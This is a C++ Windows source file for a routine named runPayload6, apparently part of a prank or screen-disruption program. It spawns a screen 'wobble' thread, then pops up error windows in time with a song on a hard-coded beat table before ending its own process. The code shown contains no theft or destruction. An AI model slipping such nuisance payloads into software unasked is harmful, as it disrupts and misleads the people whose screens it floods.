#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif
#include <windows.h>
#include <wchar.h>
#include <commctrl.h>
#include "../Cascade.h"
#include "../SongSync.h"
#include "../Wobble.h"
#include "../Flags.h"

#pragma comment(lib, "comctl32.lib")
#pragma comment(linker, "/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

extern void PreloadIcon();
extern void SpawnError();

static const int P6_DELAYS[218] = {
    224,   216,   216,   240,   447,
    201,   216,   471,   417,   216,
    207,   216,   192,   216,   216,
    249,   216,   416,   216,   233,
    183,   225,   224,   209,   231,
    216,   225,   224,   209,   231,
    216,   208,   408,   207,   216,
    417,   456,   231,   225,   231,
    216,   225,   207,   233,   216,
    408,   209,   231,   441,   432,
    447,   432,   233,   200,   216,
    216,   432,   225,   224,   416,
    441,   224,   209,   240,   216,
    207,   225,   200,   231,   408,
    209,   224,   233,   216,   224,
    216,   192,   225,   207,   240,
    209,   224,   209,   240,   416,
    216,   225,   456,   408,   216,
    224,   240,   192,   224,   240,
    201,   224,   408,   224,   209,
    416,   456,   449,   432,
    199,   216,   208,   224,   432,
    201,   207,   224,   209,   224,
    233,   401,   231,   216,   216,
    233,   224,   209,   440,   216,
    209,   240,   209,   248,   200,
    441,   192,   216,   207,   201,
    240,   224,   408,   209,   224,
    209,   240,   248,   209,   416,
    224,   216,   216,   225,   216,
    215,   449,   208,   231,   222,
    203,   209,   231,   449,   216,
    209,   224,   216,   209,   216,
    440,   240,   192,   216,   216,
    209,   216,   416,   224,   233,
    209,   224,   224,   208,   449,
    216,   231,   209,   224,   216,
    233,   416,   233,   216,   207,
    201,   240,   192,   416,   216,
    200,   216,   240,   201,   216,
    464,   224,   209,   209,   231,
    208,   224,   449,   224,   209,
    209,   216,   231,   225
};

void runPayload6() {
    if (!NoGdiFlag()) {
        DWORD* wobMs = new DWORD(54781);
        HANDLE hWobble = CreateThread(NULL, 0, WobbleAmbientProc, wobMs, 0, NULL);
        if (hWobble) CloseHandle(hWobble);
    }

    bool anchored = false;
    DWORD base = SongSyncBase(126834, &anchored);
    SongSyncWait(base);

    PreloadIcon();

    INITCOMMONCONTROLSEX icc = { sizeof(icc), ICC_STANDARD_CLASSES };
    InitCommonControlsEx(&icc);

    CascadeStart();

    srand((unsigned)GetTickCount() ^ 0x6B61);

    const int beatCount = (int)(sizeof(P6_DELAYS) / sizeof(P6_DELAYS[0]));
    DWORD acc = 0;
    for (int i = 0; i < beatCount; i++) {
        if (base) {
            DWORD target = base + acc;
            while ((LONG)(GetTickCount() - target) < 0) Sleep(5);
            if (i + 1 < beatCount) acc += (DWORD)P6_DELAYS[i];
        } else if (i > 0) {
            Sleep((DWORD)P6_DELAYS[i - 1]);
        }
        SpawnError();
    }

    TerminateProcess(GetCurrentProcess(), 0);
}